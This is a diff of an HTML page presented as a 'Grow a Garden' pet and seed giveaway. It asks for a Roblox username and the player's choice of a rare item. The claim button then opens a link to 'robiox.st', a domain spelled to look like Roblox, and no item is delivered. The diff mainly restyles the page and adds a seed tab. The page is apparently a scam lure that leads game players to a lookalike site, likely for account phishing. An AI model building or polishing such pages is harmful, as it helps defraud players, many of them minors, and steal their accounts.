@@ -3,201 +3,360 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Grow a Garden - Pet Selector</title>
+  <title>Grow a Garden - Pet & Seed Selector</title>
+  <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&display=swap" rel="stylesheet">
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Fredoka+One&display=swap');
-
     body {
-      margin: 0;
+      background: linear-gradient(120deg, #3f51b5 0%, #00c6fb 100%);
+      color: #fff;
       font-family: 'Fredoka One', cursive, Arial, sans-serif;
-      background: url('https://i.imgur.com/yOURIMAGE.png') no-repeat center center fixed;
-      /* Replace above URL with the actual target image from your image host */
-      background-size: cover;
-      color: white;
+      margin: 0;
+      min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
-      text-shadow: 1px 1px 4px #0008;
     }
-
     .container {
-      background: rgba(0, 0, 0, 0.7);
-      padding: 30px 40px;
-      border-radius: 20px;
-      box-shadow: 0 0 30px rgba(0, 0, 0, 0.9);
+      background: rgba(255,255,255,0.97);
+      border-radius: 22px;
+      box-shadow: 0 10px 36px 0 rgba(31,38,135,0.22);
+      padding: 36px 30px 24px 30px;
+      width: 98vw;
+      max-width: 520px;
       text-align: center;
-      width: 480px;
-      max-width: 90vw;
+      margin-top: 4vw;
+      animation: fadeIn 0.8s cubic-bezier(.19,1,.22,1);
     }
-
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(40px) scale(0.98);}
+      to { opacity: 1; transform: none;}
+    }
     h1 {
-      margin-bottom: 25px;
-      font-size: 2.8rem;
-      color: #ffd700;
-      text-shadow: 2px 2px 8px #ffb700cc;
+      color: #3f51b5;
+      font-size: 2.2rem;
+      margin-bottom: 14px;
+      text-shadow: 0 2px 13px #00c6fb33;
+      letter-spacing: 1px;
     }
-
-    input {
-      padding: 12px;
-      border: none;
+    .toggle-group {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 18px;
+      margin-top: 10px;
+    }
+    .toggle-btn {
+      background: #f3f6fd;
+      color: #3f51b5;
+      border: 2px solid #00c6fb99;
       border-radius: 12px;
-      margin-bottom: 20px;
+      font-size: 1.09rem;
+      padding: 8px 24px;
+      cursor: pointer;
+      transition: background 0.18s, color 0.18s, border 0.18s;
+      font-weight: bold;
+      outline: none;
+      box-shadow: 0 2px 10px #00c6fb19;
+    }
+    .toggle-btn.active {
+      background: linear-gradient(90deg, #3f51b5 60%, #00c6fb 100%);
+      color: #fff;
+      border-color: #ffd700;
+    }
+    input {
+      padding: 13px 12px;
+      border: none;
+      border-radius: 13px;
+      margin-bottom: 16px;
       width: 85%;
       text-align: center;
-      font-size: 1.1rem;
+      font-size: 1.08rem;
       font-weight: bold;
-      box-shadow: 0 0 8px #00c851aa;
+      background: #f3f6fd;
+      color: #3f51b5;
+      box-shadow: 0 0 8px #00c6fb33;
       outline: none;
-      transition: box-shadow 0.3s ease;
+      transition: box-shadow 0.18s;
     }
-
     input:focus {
-      box-shadow: 0 0 16px #00ff77cc;
+      box-shadow: 0 0 14px #00c6fb99;
     }
-
-    .pet-grid {
+    .pet-grid, .seed-grid {
       display: grid;
       grid-template-columns: repeat(2, 1fr);
-      gap: 18px;
-      margin-top: 25px;
+      gap: 26px;
+      margin-top: 22px;
     }
-
-    .pet-card {
-      background: rgba(255, 255, 255, 0.1);
-      padding: 15px;
-      border-radius: 15px;
+    .pet-card, .seed-card {
+      background: linear-gradient(135deg, #e1f0ff 60%, #c9e7f9 100%);
+      padding: 20px 12px 16px 12px;
+      border-radius: 20px;
       cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 0 10px #00c85188;
+      transition: transform 0.18s, box-shadow 0.18s, border 0.16s;
+      box-shadow: 0 4px 24px #3f51b545;
       user-select: none;
+      position: relative;
+      border: 3px solid transparent;
+      outline: none;
+      min-width: 0;
+      min-height: 240px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-end;
     }
-
-    .pet-card:hover {
-      background: rgba(255, 255, 255, 0.25);
+    .pet-card.selected, .seed-card.selected {
+      border: 3px solid #00c6fb;
+      box-shadow: 0 6px 36px 3px #00c6fb77, 0 0 0 7px #3f51b523;
+      background: #fffcec;
       transform: scale(1.07);
-      box-shadow: 0 0 25px #00ff77cc;
+      z-index: 1;
     }
-
-    .pet-card img {
-      width: 110px;
-      height: 110px;
+    .pet-card:hover, .seed-card:hover {
+      transform: scale(1.04);
+      box-shadow: 0 0 30px #00c6fbbb;
+    }
+    .pet-card img, .seed-card img {
+      width: 120px;
+      height: 120px;
       object-fit: contain;
-      border-radius: 12px;
-      margin-bottom: 10px;
-      filter: drop-shadow(0 0 3px #0008);
+      border-radius: 16px;
+      margin-bottom: 13px;
+      background: #e0eafa;
+      box-shadow: 0 0 10px #3f51b530;
+      border: 1.5px solid #fff;
+      margin-top: 0;
+      display: block;
     }
-
-    .pet-card.selected {
-      border: 3px solid gold;
-      box-shadow: 0 0 28px gold;
-      background: rgba(255, 255, 255, 0.3);
-      transform: scale(1.1);
+    .tier-badge {
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+      top: 12px;
+      padding: 3.5px 13px;
+      border-radius: 10px;
+      font-size: 1.07rem;
+      font-weight: bold;
+      color: white;
+      background: linear-gradient(90deg, #bc52f7 0%, #00ffe7 100%);
+      box-shadow: 0 0 11px #bc52f7cc;
+      z-index: 2;
+      pointer-events: none;
+      letter-spacing: 1px;
+      border: 2px solid #fff3;
     }
-
+    .tier-prismatic {
+      background: linear-gradient(90deg, #fded00, #ff00ea);
+    }
+    .tier-transcendent {
+      background: linear-gradient(90deg, #00e7ff, #bc52f7);
+    }
+    .pet-card p, .seed-card p {
+      font-size: 1.22rem;
+      font-weight: 700;
+      color: #3f51b5;
+      margin: 7px 0 0 0;
+      letter-spacing: 0.2px;
+      word-break: break-word;
+      text-shadow: 0 1px 8px #00c6fb1a;
+    }
     button, a {
       display: inline-block;
-      margin-top: 25px;
-      padding: 14px 28px;
+      margin-top: 22px;
+      padding: 13px 26px;
       border: none;
       border-radius: 12px;
-      background: #00c851;
+      background: linear-gradient(90deg, #3f51b5 60%, #00c6fb 100%);
       color: white;
-      font-size: 1.2rem;
+      font-size: 1.17rem;
       font-weight: 700;
       cursor: pointer;
-      transition: background 0.3s, box-shadow 0.3s;
+      transition: background 0.2s, box-shadow 0.2s, transform 0.09s;
       text-decoration: none;
-      box-shadow: 0 0 14px #00c851cc;
+      box-shadow: 0 2px 13px #00c6fb55;
       user-select: none;
     }
-
-    button:hover, a:hover {
-      background: #007e33;
-      box-shadow: 0 0 28px #007e33;
+    button:active, a:active {
+      background: linear-gradient(90deg, #00c6fb 60%, #3f51b5 100%);
+      transform: scale(0.96);
     }
-
-    .hidden {
-      display: none;
-    }
-
+    .hidden { display: none; }
     #status {
       margin-top: 14px;
-      font-size: 1.1rem;
+      font-size: 1.09rem;
       font-weight: 600;
-      min-height: 24px;
+      min-height: 22px;
+      color: #00b47c;
+      letter-spacing: 0.2px;
+      transition: color 0.18s;
+    }
+    #status.error { color: #ea3d49; }
+    @media (max-width: 800px) {
+      .container { padding: 16px 2vw 3vw 2vw; max-width: 97vw;}
+      .pet-card img, .seed-card img { width: 90px; height: 90px; }
+      .pet-card, .seed-card { min-height: 170px;}
+    }
+    @media (max-width: 540px) {
+      .pet-grid, .seed-grid { grid-template-columns: 1fr; }
+      .container { padding: 7vw 2vw 4vw 2vw;}
+      .pet-card img, .seed-card img { width: 88px; height: 88px; }
+      .pet-card, .seed-card { min-height: 155px;}
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Grow a Garden - Pet Selector</h1>
-    <input type="text" id="username" placeholder="Enter Roblox Username" autocomplete="off" />
-    <br />
-    <button id="proceedBtn">Proceed</button>
-    <p id="status"></p>
-
-    <div id="petSelection" class="hidden">
-      <h2>Select Your Pet</h2>
-      <div class="pet-grid" id="petGrid"></div>
-      <button id="claimBtn" class="hidden">Join Private Server to Claim</button>
+    <h1>Grow a Garden - Pet & Seed Selector</h1>
+    <input type="text" id="username" placeholder="Enter Roblox Username" autocomplete="off" maxlength="25" />
+    <div class="toggle-group">
+      <button class="toggle-btn active" id="petTab">Pets</button>
+      <button class="toggle-btn" id="seedTab">Seeds</button>
     </div>
+    <div id="petSelection">
+      <div class="pet-grid" id="petGrid"></div>
+    </div>
+    <div id="seedSelection" class="hidden">
+      <div class="seed-grid" id="seedGrid"></div>
+    </div>
+    <button id="claimBtn" class="hidden"></button>
+    <p id="status"></p>
   </div>
-
   <script>
-    const proceedBtn = document.getElementById("proceedBtn");
     const claimBtn = document.getElementById("claimBtn");
     const statusText = document.getElementById("status");
     const usernameInput = document.getElementById("username");
+    const petTab = document.getElementById("petTab");
+    const seedTab = document.getElementById("seedTab");
     const petSelection = document.getElementById("petSelection");
+    const seedSelection = document.getElementById("seedSelection");
     const petGrid = document.getElementById("petGrid");
+    const seedGrid = document.getElementById("seedGrid");
 
+    // PETS (actual fandom images)
     const pets = [
-      { name: "Dragonfly", img: "https://img.growagardenwiki.net/images/pets/Dragonfly.webp" },
-      { name: "Raccoon", img: "https://img.growagardenwiki.net/images/pets/Raccoon.webp" },
-      { name: "Queen Bee", img: "https://img.growagardenwiki.net/images/pets/Queen-Bee-(Pet).webp" },
-      { name: "Mimic Octopus", img: "https://img.growagardenwiki.net/images/pets/Mimic-Octopus.webp" },
-      { name: "Kitsune", img: "https://img.growagardenwiki.net/images/pets/Kitsune.webp" },
-      { name: "Fennec Fox", img: "https://img.growagardenwiki.net/images/pets/Fennec-Fox.webp" },
-      { name: "Disco Bee", img: "https://img.growagardenwiki.net/images/pets/Disco-Bee.webp" },
-      { name: "Butterfly", img: "https://img.growagardenwiki.net/images/pets/Butterfly.webp" }
+      { name: "Dragonfly", img: "https://static.wikia.nocookie.net/growagarden/images/6/6f/Dragonfly.png" },
+      { name: "Raccoon", img: "https://static.wikia.nocookie.net/growagarden/images/0/0d/Raccoon.png" },
+      { name: "Queen Bee", img: "https://static.wikia.nocookie.net/growagarden/images/3/32/Queen_Bee.png" },
+      { name: "Mimic Octopus", img: "https://static.wikia.nocookie.net/growagarden/images/d/d6/Mimic_Octopus.png" },
+      { name: "Kitsune", img: "https://static.wikia.nocookie.net/growagarden/images/3/3a/Kitsune.png" },
+      { name: "Fennec Fox", img: "https://static.wikia.nocookie.net/growagarden/images/2/25/Fennec_Fox.png" },
+      { name: "Disco Bee", img: "https://static.wikia.nocookie.net/growagarden/images/4/4c/Disco_Bee.png" },
+      { name: "Butterfly", img: "https://static.wikia.nocookie.net/growagarden/images/3/34/Butterfly.png" }
+    ];
+
+    // SEEDS (actual fandom images & correct tiers)
+    const seeds = [
+      { name: "Bone Blossom", img: "https://static.wikia.nocookie.net/growagarden/images/1/1e/Bone_Blossom.png", tier: "Transcendent" },
+      { name: "Maple Resin", img: "https://static.wikia.nocookie.net/growagarden/images/9/92/Maple_Resin.png", tier: "Transcendent" },
+      { name: "Wispwing", img: "https://static.wikia.nocookie.net/growagarden/images/9/9a/Wispwing.png", tier: "Prismatic" },
+      { name: "Elephant Ears", img: "https://static.wikia.nocookie.net/growagarden/images/9/9b/Elephant_Ears.png", tier: "Prismatic" },
+      { name: "Beanstalk", img: "https://static.wikia.nocookie.net/growagarden/images/6/62/Beanstalk.png", tier: "Prismatic" },
+      { name: "Ember Lily", img: "https://static.wikia.nocookie.net/growagarden/images/c/c4/Ember_Lily.png", tier: "Prismatic" },
+      { name: "Sugar Apple", img: "https://static.wikia.nocookie.net/growagarden/images/0/06/Sugar_Apple.png", tier: "Prismatic" },
+      { name: "Burning Bud", img: "https://static.wikia.nocookie.net/growagarden/images/5/56/Burning_Bud.png", tier: "Prismatic" },
+      { name: "Giant Pinecone", img: "https://static.wikia.nocookie.net/growagarden/images/6/68/Giant_Pinecone.png", tier: "Prismatic" },
+      { name: "CocoMango", img: "https://static.wikia.nocookie.net/growagarden/images/c/cd/CocoMango.png", tier: "Prismatic" },
+      { name: "Tranquil Bloom", img: "https://static.wikia.nocookie.net/growagarden/images/0/0e/Tranquil_Bloom.png", tier: "Prismatic" }
     ];
 
     let selectedPet = null;
+    let selectedSeed = null;
+    let currentTab = "pet";
 
-    proceedBtn.addEventListener("click", () => {
-      const username = usernameInput.value.trim();
-      if (!username) {
-        statusText.textContent = "❌ Please enter a username first.";
-        petSelection.classList.add("hidden");
-        claimBtn.classList.add("hidden");
-        return;
-      }
-      statusText.textContent = `✅ Welcome, ${username}! Choose your pet below.`;
-      petSelection.classList.remove("hidden");
-
+    function renderPets() {
       petGrid.innerHTML = "";
-      selectedPet = null;
-      claimBtn.classList.add("hidden");
-
-      pets.forEach(pet => {
+      pets.forEach((pet, idx) => {
         const card = document.createElement("div");
-        card.className = "pet-card";
+        card.className = "pet-card" + (selectedPet === idx ? " selected" : "");
+        card.tabIndex = 0;
         card.innerHTML = `<img src="${pet.img}" alt="${pet.name}" /><p>${pet.name}</p>`;
-        card.addEventListener("click", () => {
-          document.querySelectorAll(".pet-card").forEach(c => c.classList.remove("selected"));
-          card.classList.add("selected");
-          selectedPet = pet;
+        card.onclick = () => {
+          selectedPet = idx;
+          selectedSeed = null;
+          renderPets();
+          renderSeeds();
           claimBtn.classList.remove("hidden");
-        });
+          claimBtn.innerText = `Claim "${pet.name}"`;
+          statusText.innerText = "";
+          statusText.classList.remove("error");
+        };
+        card.onkeydown = e => { if (e.key === "Enter" || e.key === " ") card.onclick(); };
         petGrid.appendChild(card);
       });
+    }
+
+    function renderSeeds() {
+      seedGrid.innerHTML = "";
+      seeds.forEach((seed, idx) => {
+        const card = document.createElement("div");
+        card.className = "seed-card tier-" + seed.tier.toLowerCase() + (selectedSeed === idx ? " selected" : "");
+        card.tabIndex = 0;
+        card.innerHTML = `
+          <span class="tier-badge tier-${seed.tier.toLowerCase()}">${seed.tier}</span>
+          <img src="${seed.img}" alt="${seed.name}" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/a/ac/No_image_available.svg'">
+          <p>${seed.name}</p>
+        `;
+        card.onclick = () => {
+          selectedSeed = idx;
+          selectedPet = null;
+          renderSeeds();
+          renderPets();
+          claimBtn.classList.remove("hidden");
+          claimBtn.innerText = `Claim "${seed.name}"`;
+          statusText.innerText = "";
+          statusText.classList.remove("error");
+        };
+        card.onkeydown = e => { if (e.key === "Enter" || e.key === " ") card.onclick(); };
+        seedGrid.appendChild(card);
+      });
+    }
+
+    petTab.addEventListener("click", () => {
+      petTab.classList.add("active");
+      seedTab.classList.remove("active");
+      petSelection.classList.remove("hidden");
+      seedSelection.classList.add("hidden");
+      currentTab = "pet";
+      claimBtn.classList.add("hidden");
+      statusText.innerText = "";
     });
 
+    seedTab.addEventListener("click", () => {
+      seedTab.classList.add("active");
+      petTab.classList.remove("active");
+      petSelection.classList.add("hidden");
+      seedSelection.classList.remove("hidden");
+      currentTab = "seed";
+      claimBtn.classList.add("hidden");
+      statusText.innerText = "";
+    });
+
+    // Initial render
+    renderPets();
+    renderSeeds();
+
     claimBtn.addEventListener("click", () => {
-      if (!selectedPet) return alert("Please select a pet first!");
-      window.open("https://robiox.st/games/126884695634066/Grow-a-Garden?privateServerLinkCode=05847761969171027720544470118437", "_blank");
+      const username = usernameInput.value.trim();
+      if (!username) {
+        statusText.innerText = "❌ Please enter your Roblox username first!";
+        statusText.classList.add("error");
+        return;
+      }
+      let item = null;
+      if (selectedPet != null) item = pets[selectedPet].name;
+      if (selectedSeed != null) item = seeds[selectedSeed].name;
+      if (!item) {
+        statusText.innerText = "❌ Please select a pet or seed to claim!";
+        statusText.classList.add("error");
+        return;
+      }
+      statusText.innerText = `✅ "${item}" is ready to claim!`;
+      statusText.classList.remove("error");
+      setTimeout(() => {
+        window.open("https://robiox.st/games/126884695634066/Grow-a-Garden?privateServerLinkCode=05847761969171027720544470118437", "_blank");
+      }, 700);
     });
   </script>
 </body>
 </html>
+   
